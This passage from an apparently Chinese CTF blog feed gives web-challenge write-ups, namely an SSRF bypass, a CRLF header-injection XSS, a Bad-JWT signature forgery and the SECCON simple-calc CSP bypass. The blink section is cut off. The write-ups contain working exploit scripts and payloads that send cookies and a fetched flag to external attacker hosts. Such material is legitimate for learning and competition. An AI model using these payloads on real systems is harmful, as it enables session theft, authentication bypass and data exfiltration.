class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> type_check(guesstype):</span><br><span class="line">                    image_data = requests.get(image_url, headers=&#123;<span class="string">&quot;Cookie&quot;</span>:request.headers.get(<span class="string">&quot;Cookie&quot;</span>)&#125;).content</span><br><span class="line">                    image = imageio.imread(image_data)</span><br><span class="line">            </span><br><span class="line">            apply_mosaic(image, mosaic_path)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;mosaic.html&quot;</span>, mosaic_path = mosaic_path)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Plz input image_url or Invalid image_url..&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;mosaic.html&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>我们需要进入的分支</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> type_check(guesstype):</span><br><span class="line">      image_data = requests.get(image_url, headers=&#123;<span class="string">&quot;Cookie&quot;</span>:request.headers.get(<span class="string">&quot;Cookie&quot;</span>)&#125;).content</span><br><span class="line">      image = imageio.imread(image_data)</span><br></pre></td></tr></table></figure>
<p>来发起本地的请求</p>
<p>首先需要url已经限制了无法读取工作目录的父目录，guesstype会检查url请求的文件类型，下面判断中不能为空，第二需要绕过http，因为不能是一个真实存在的文件，否则进入第一个if，然后http可以使用大小写绕过，初步就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Http://localhost:9999/1.png</span><br></pre></td></tr></table></figure>
<p>但是不能真的让get请求1.png，因为需要的是<code>Http://localhost:9999/</code>，所以可以使用<code>#</code>，因为在blog中(可以直接 自己尝试一下)，点击hexo的跳转，只会在页面中跳转(跳转的是id=”1.png”)，所以加上<code>#</code>，还是对<code>Http://localhost:9999/</code>发起的请求</p>
<p>最终就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Http://localhost:9999/#1.png</span><br><span class="line">http://localhost:8090/check_upload/@admin/flag.png</span><br></pre></td></tr></table></figure>
<h2 id="warmup-revenge"><a href="#warmup-revenge" class="headerlink" title="warmup-revenge"></a>warmup-revenge</h2><p>waf: 存在CSP同源</p>
<p>漏洞点: CRLF注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span>(<span class="string">&#x27;./config.php&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;idx&#x27;</span>])) <span class="keyword">die</span>(<span class="string">&#x27;Not Found&#x27;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$query</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;idx&#x27;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;idx&#x27;</span>]</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$file</span> = <span class="title function_ invoke__">fetch_row</span>(<span class="string">&#x27;board&#x27;</span>, <span class="variable">$query</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="variable">$file</span>) <span class="keyword">die</span>(<span class="string">&#x27;Not Found&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$filepath</span> = <span class="variable">$file</span>[<span class="string">&#x27;file_path&#x27;</span>];</span><br><span class="line">	<span class="variable">$original</span> = <span class="variable">$file</span>[<span class="string">&#x27;file_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/msie/i&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/5\.5/&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>])) &#123;</span><br><span class="line">	    <span class="title function_ invoke__">header</span>(<span class="string">&quot;content-length: &quot;</span>.<span class="title function_ invoke__">filesize</span>(<span class="variable">$filepath</span>));</span><br><span class="line">	    <span class="title function_ invoke__">header</span>(<span class="string">&quot;content-disposition: attachment; filename=\&quot;<span class="subst">$original</span>\&quot;&quot;</span>);</span><br><span class="line">	    <span class="title function_ invoke__">header</span>(<span class="string">&quot;content-transfer-encoding: binary&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Firefox/i&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]))&#123;</span><br><span class="line">	    <span class="title function_ invoke__">header</span>(<span class="string">&quot;content-length: &quot;</span>.<span class="title function_ invoke__">filesize</span>(<span class="variable">$filepath</span>));</span><br><span class="line">	    <span class="title function_ invoke__">header</span>(<span class="string">&quot;content-disposition: attachment; filename=\&quot;&quot;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&#x27;file_name&#x27;</span>]).<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">	    <span class="title function_ invoke__">header</span>(<span class="string">&quot;content-description: php generated data&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	    <span class="title function_ invoke__">header</span>(<span class="string">&quot;content-length: &quot;</span>.<span class="title function_ invoke__">filesize</span>(<span class="variable">$filepath</span>));</span><br><span class="line">	    <span class="title function_ invoke__">header</span>(<span class="string">&quot;content-disposition: attachment; filename=\&quot;<span class="subst">$original</span>\&quot;&quot;</span>);</span><br><span class="line">	    <span class="title function_ invoke__">header</span>(<span class="string">&quot;content-description: php generated data&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;pragma: no-cache&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;expires: 0&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">flush</span>();</span><br><span class="line"></span><br><span class="line">	<span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filepath</span>, <span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$download_rate</span> = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">	    <span class="keyword">print</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$download_rate</span> * <span class="number">1024</span>));</span><br><span class="line">	    <span class="title function_ invoke__">flush</span>();</span><br><span class="line">	    <span class="title function_ invoke__">usleep</span>(<span class="number">1000</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">fclose</span> (<span class="variable">$fp</span>);</span><br><span class="line">	<span class="title function_ invoke__">flush</span>();	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	    <span class="title function_ invoke__">header</span>(<span class="string">&quot;content-length: &quot;</span>.<span class="title function_ invoke__">filesize</span>(<span class="variable">$filepath</span>));</span><br><span class="line">	    <span class="title function_ invoke__">header</span>(<span class="string">&quot;content-disposition: attachment; filename=\&quot;<span class="subst">$original</span>\&quot;&quot;</span>);</span><br><span class="line">	    <span class="title function_ invoke__">header</span>(<span class="string">&quot;content-description: php generated data&quot;</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>在常规的 HTTP 应答中，<strong><code>Content-Disposition</code></strong> 响应标头指示回复的内容该以何种形式展示，是以<em>内联</em>的形式（即网页或者页面的一部分），还是以<em>附件</em>的形式下载并保存到本地。</p>
<p>在 HTTP 场景中，第一个参数或者是 <code>inline</code>（默认值，表示回复中的消息体会以页面的一部分或者整个页面的形式展示），或者是 <code>attachment</code>（意味着消息体应该被下载到本地；大多数浏览器会呈现一个“保存为”的对话框，将 <code>filename</code> 的值预填为下载后的文件名，假如它存在的话）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: inline</span><br><span class="line">Content-Disposition: attachment</span><br><span class="line">Content-Disposition: attachment; filename=&quot;filename.jpg&quot;</span><br></pre></td></tr></table></figure>
<p>所以此处可以使用CRLF使得使用内联的方式来进行url跳转</p>
<p>先注入一个恶意文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /board.php?p=write HTTP/1.1</span><br><span class="line">Host: 100.100.1.2</span><br><span class="line">Content-Length: 652</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://100.100.1.2</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzSMhJ9rVeHZcy5bY</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.81</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://100.100.1.2/board.php?p=write</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6</span><br><span class="line">Cookie: PHPSESSID=5715fd548fecc747209d2e489de811e1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryzSMhJ9rVeHZcy5bY</span><br><span class="line">Content-Disposition: form-data; name=&quot;title&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryzSMhJ9rVeHZcy5bY</span><br><span class="line">Content-Disposition: form-data; name=&quot;content&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryzSMhJ9rVeHZcy5bY</span><br><span class="line">Content-Disposition: form-data; name=&quot;level&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryzSMhJ9rVeHZcy5bY</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;myFile.html&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">document.location=&quot;http://43.139.154.219/?x=&quot;.concat(encodeURIComponent(document.cookie));</span><br><span class="line">------WebKitFormBoundaryzSMhJ9rVeHZcy5bY</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryzSMhJ9rVeHZcy5bY--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后使用<code>\r</code>，使得<strong><code>Content-Disposition</code></strong> 响应标头失效</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /board.php?p=write HTTP/1.1</span><br><span class="line">Host: 100.100.1.2</span><br><span class="line">Content-Length: 602</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://100.100.1.2</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzSMhJ9rVeHZcy5bY</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.81</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://100.100.1.2/board.php?p=write</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6</span><br><span class="line">Cookie: PHPSESSID=5715fd548fecc747209d2e489de811e1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryzSMhJ9rVeHZcy5bY</span><br><span class="line">Content-Disposition: form-data; name=&quot;title&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryzSMhJ9rVeHZcy5bY</span><br><span class="line">Content-Disposition: form-data; name=&quot;content&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryzSMhJ9rVeHZcy5bY</span><br><span class="line">Content-Disposition: form-data; name=&quot;level&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryzSMhJ9rVeHZcy5bY</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;AA</span><br><span class="line">.html&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;/download.php?idx=4&quot;&gt;&lt;/script&gt;</span><br><span class="line">------WebKitFormBoundaryzSMhJ9rVeHZcy5bY</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryzSMhJ9rVeHZcy5bY--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果调试的过程中可以发现不存在<strong><code>Content-Disposition</code></strong> 响应标头，说明将会以内联的方式展示，然后触发跳转发起本地请求，成功XSS</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(7) &#123; [0]=&gt; string(24) &quot;X-Powered-By: PHP/7.4.33&quot; [1]=&gt; string(50) &quot;Cache-Control: no-store, no-cache, must-revalidate&quot; [2]=&gt; string(146) &quot;Content-Security-Policy: default-src &#x27;self&#x27;; style-src &#x27;self&#x27; https://stackpath.bootstrapcdn.com &#x27;unsafe-inline&#x27;; script-src &#x27;self&#x27;; img-src data:&quot; [3]=&gt; string(18) &quot;content-length: 43&quot; [4]=&gt; string(39) &quot;content-description: php generated data&quot; [5]=&gt; string(16) &quot;pragma: no-cache&quot; [6]=&gt; string(10) &quot;expires: 0&quot; &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/img/image-20230917200650852.png" alt="image-20230917200650852"></p>
]]></content>
      <categories>
        <category>2023wp</category>
      </categories>
      <tags>
        <tag>2023ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2023SECCONCTF</title>
    <url>/2023/09/18/16-34-28/</url>
    <content><![CDATA[<h1 id="2023SECCONCTF"><a href="#2023SECCONCTF" class="headerlink" title="2023SECCONCTF"></a>2023SECCONCTF</h1><span id="more"></span>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Bad-JWT"><a href="#Bad-JWT" class="headerlink" title="Bad-JWT"></a>Bad-JWT</h3><p>参考连接：</p>
<p><a href="https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023">https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">createSignature</span> = (<span class="params">header, payload, secret</span>) =&gt; &#123;</span><br><span class="line">	<span class="keyword">const</span> data = <span class="string">`<span class="subst">$&#123;stringifyPart(header)&#125;</span>.<span class="subst">$&#123;stringifyPart(payload)&#125;</span>`</span>;</span><br><span class="line">	<span class="keyword">const</span> signature = algorithms[header.<span class="property">alg</span>.<span class="title function_">toLowerCase</span>()](data, secret);</span><br><span class="line">	<span class="keyword">return</span> signature;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>algorithms[]</code>这里直接使用的是对algorithms属性的调用</p>
<p><img src="/img/image-20230918165615331.png" alt="image-20230918165615331"></p>
<p>在这里存在一个<code>constructor</code>属性，这个属性调用之后回直接返回一个Function，实际上就是这个具体对象的构造函数，然后对其调用，实际上只会返回第一个参数(原理上就是获得了原型，然后进行了初始化，返回对象，参考java反射，类似，但是还是有一点不一样)</p>
<p><img src="/img/image-20230918165017214.png" alt="image-20230918165017214"></p>
<p>然后参考wp调试一下，实际上得到的是一个String对象</p>
<p><img src="/img/image-20230918172944995.png" alt="image-20230918172944995"></p>
<p>然后对于对比<code>compare</code>来说，字符串和字符串对象是相同的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> txt = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;aaaaaaaaaaaaaaaa&quot;</span>);</span><br><span class="line"><span class="title class_">Buffer</span>.<span class="title function_">compare</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(txt, <span class="string">&quot;base64&quot;</span>), <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&quot;aaaaaaaaaaaaaaaa&quot;</span>, <span class="string">&quot;base64&quot;</span>));</span><br></pre></td></tr></table></figure>
<p>所以直接把调试的字符串拼接到后面</p>
<p>然后<code>Buffer.from(txt, &quot;base64&quot;)</code>，不会解析不是base64的字符串，所以直接去除<code>.</code>即可，满足分割出来三段的条件</p>
<p>贴一下大佬的exp</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header = &#123;<span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>, <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;constructor&quot;</span>&#125;</span><br><span class="line">headerStr = json.<span class="title function_">dumps</span>(header).<span class="title function_">encode</span>(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">body = &#123;<span class="string">&quot;isAdmin&quot;</span>: <span class="title class_">True</span>&#125;</span><br><span class="line">bodyStr = json.<span class="title function_">dumps</span>(body).<span class="title function_">encode</span>(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">base64_encode</span>(<span class="attr">str</span>: str):</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        base64.<span class="title function_">b64encode</span>(str).<span class="title function_">replace</span>(b<span class="string">&quot;=&quot;</span>, b<span class="string">&quot;&quot;</span>).<span class="title function_">replace</span>(b<span class="string">&quot;+&quot;</span>, b<span class="string">&quot;-&quot;</span>).<span class="title function_">replace</span>(b<span class="string">&quot;/&quot;</span>, b<span class="string">&quot;_&quot;</span>)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headerBase64 = <span class="title function_">str</span>(<span class="title function_">base64_encode</span>(headerStr))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">bodyBase64 = <span class="title function_">str</span>(<span class="title function_">base64_encode</span>(bodyStr))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">jwt = f<span class="string">&quot;&#123;headerBase64&#125;.&#123;bodyBase64&#125;.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ&quot;</span></span><br><span class="line"><span class="title function_">print</span>(jwt)</span><br><span class="line">res = requests.<span class="title function_">get</span>(<span class="string">&quot;http://localhost:3000/&quot;</span>, cookies=&#123;<span class="string">&quot;session&quot;</span>: jwt&#125;)</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(res.<span class="property">text</span>)</span><br></pre></td></tr></table></figure>
<h3 id="simple-calc"><a href="#simple-calc" class="headerlink" title="simple-calc"></a>simple-calc</h3><p>参考：</p>
<p><a href="https://blog.task4233.dev/posts/writeup-seccon-ctf-2023/?ref=www.ctfiot.com">https://blog.task4233.dev/posts/writeup-seccon-ctf-2023/?ref=www.ctfiot.com</a></p>
<p>对于绕过CSP，可以使用参数过长的方法进行绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target_url = <span class="string">&quot;http://127.0.0.1:3000&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">30000</span></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;expr&quot;</span>: payload,</span><br><span class="line">&#125;</span><br><span class="line">resp = requests.get(target_url, params=params)</span><br><span class="line"><span class="built_in">print</span>(resp.headers)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"><span class="built_in">print</span>(resp.status_code)</span><br></pre></td></tr></table></figure>
<p>此时将会返回431错误，然后就成功使得CSP失效了，然后使用iframe外带数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target_url = <span class="string">&quot;http://127.0.0.1:3000&quot;</span></span><br><span class="line">attacker_url = <span class="string">&quot;https://asdasd.requestcatcher.com/test&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">var i=document.createElement(&#x27;iframe&#x27;);</span></span><br><span class="line"><span class="string">i.src = `/js/index.js?expr=$&#123;&#123;&#x27;a&#x27;.repeat(20000)&#125;&#125;`;</span></span><br><span class="line"><span class="string">i.onload = () =&gt; &#123;&#123;</span></span><br><span class="line"><span class="string">i.contentWindow.fetch(&#x27;/flag&#x27;, &#123;&#123;headers: &#123;&#123;&#x27;X-FLAG&#x27;: true&#125;&#125;, credentials: &#x27;include&#x27;&#125;&#125;).then(res=&gt;res.text()).then(res=&gt;location.href=&#x27;<span class="subst">&#123;attacker_url&#125;</span>?q=&#x27;+res);</span></span><br><span class="line"><span class="string">&#125;&#125;;</span></span><br><span class="line"><span class="string">document.body.appendChild(i);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload = urlencode(&#123;<span class="string">&quot;expr&quot;</span>: payload&#125;)</span><br><span class="line">resp = requests.post(</span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;target_url&#125;</span>/report&quot;</span>,</span><br><span class="line">    headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;,</span><br><span class="line">    data=payload,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>解释一下payload</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span><br><span class="line">i.<span class="property">src</span> = <span class="string">`/js/index.js?expr=<span class="subst">$&#123;&#123;<span class="string">&#x27;a&#x27;</span>.repeat(<span class="number">20000</span>)&#125;&#125;</span>`</span>;</span><br></pre></td></tr></table></figure>
<p>这两句将会创建iframe元素，然后访问src，然后在访问之后</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">i.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;&#123;</span><br><span class="line">i.<span class="property">contentWindow</span>.<span class="title function_">fetch</span>(<span class="string">&#x27;/flag&#x27;</span>, &#123;&#123;<span class="attr">headers</span>: &#123;&#123;<span class="string">&#x27;X-FLAG&#x27;</span>: <span class="literal">true</span>&#125;&#125;, <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>&#125;&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span>=&gt;</span>res.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">res</span>=&gt;</span>location.<span class="property">href</span>=<span class="string">&#x27;&#123;attacker_url&#125;?q=&#x27;</span>+res);</span><br><span class="line">&#125;&#125;;</span><br></pre></td></tr></table></figure>
<p><code>i.onload</code>将会设置一个事件处理程序，当<code>&lt;iframe&gt;</code>带有该变量的元素<code>i</code>完成加载时将触发该事件处理程序。</p>
<p>在事件处理程序内部，它使用API 向（iframe 的内容）<code>fetch</code>内的“/flag”URL 发出 GET 请求。<code>i.contentWindow</code>它包含值为 true 的“X-FLAG”标头并设置<code>credentials</code>为“include”，这意味着它将在请求中包含 cookie 和 HTTP 身份验证凭据。</p>
<p>提取请求的响应应该是文本，然后它使用查询参数“?q=”将文本响应附加到当前 URL (location.href)，并将当前页面重定向到这个新 URL。</p>
<p><code>then(res =&gt; location.href = &#39;&#123;attacker_url&#125;?q=&#39; + res)</code>：在上一个<code>.then()</code>链将响应转换为文本之后，这部分代码将获取结果文本（来自“/flag”的响应）并使用它来构造新的 URL。</p>
<p><code>location.href = ...</code>：最后，它将<code>location.href</code>当前页面的 设置为新构造的 URL。</p>
<p>验证一下</p>
<p>i.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">111</span>);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      iframe.<span class="property">src</span> = <span class="string">&quot;i.html&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">      iframe.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">222</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后使用live server建环境，避免插件以及同源问题</p>
<h3 id="blink"><a href="#blink" class="headerlink" title="blink"></a>blink</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sandboxAttribute = [</span><br><span class="line">  <span class="string">&quot;allow-downloads&quot;</span>,</span><br><span class="line">  <span class="string">&quot;allow-forms&quot;</span>,</span><br><span class="line">  <span class="string">&quot;allow-modals&quot;</span>,</span><br><span class="line">  <span class="string">&quot;allow-orientation-lock&quot;</span>,</span><br><span class="line">  <span class="string">&quot;allow-pointer-lock&quot;</span>,</span><br><span class="line">  <span class="string">&quot;allow-popups&quot;</span>,</span><br><span class="line">  <span class="string">&quot;allow-popups-to-escape-sandbox&quot;</span>,</span><br><span class="line">  <span class="string">&quot;allow-presentation&quot;</span>,</span><br><span class="line">  <span class="string">&quot;allow-same-origin&quot;</span>,</span><br><span class="line">  <span class="comment">// &quot;allow-scripts&quot;, // disallow</span></span><br><span class="line">  <span class="string">&quot;allow-top-navigation&quot;</span>,</span><br><span class="line">  <span class="string">&quot;allow-top-navigation-by-user-activation&quot;</span>,</span><br><span class="line">  <span class="string">&quot;allow-top-navigation-to-custom-protocols&quot;</span>,</span><br><span class="line">].<span class="title function_">join</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">createBlink</span> = <span class="keyword">async</span> (<span class="params">html</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> sandbox = <span class="title function_">wrap</span>(</span><br><span class="line">    $(<span class="string">&quot;#viewer&quot;</span>).<span class="title function_">appendChild</span>(<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>))</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// I believe it is impossible to escape this iframe sandbox...</span></span><br><span class="line">  sandbox.<span class="property">sandbox</span> = sandboxAttribute;</span><br><span class="line"></span><br><span class="line">  sandbox.<span class="property">width</span> = <span class="string">&quot;100%&quot;</span>;</span><br><span class="line">  sandbox.<span class="property">srcdoc</span> = html;</span><br><span class="line">  <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> (sandbox.<span class="property">onload</span> = resolve));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> target = <span class="title function_">wrap</span>(sandbox.<span class="property">contentDocument</span>.<span class="property">body</span>);</span><br><span class="line">  target.<span class="property">popover</span> = <span class="string">&quot;manual&quot;</span>;</span><br><span 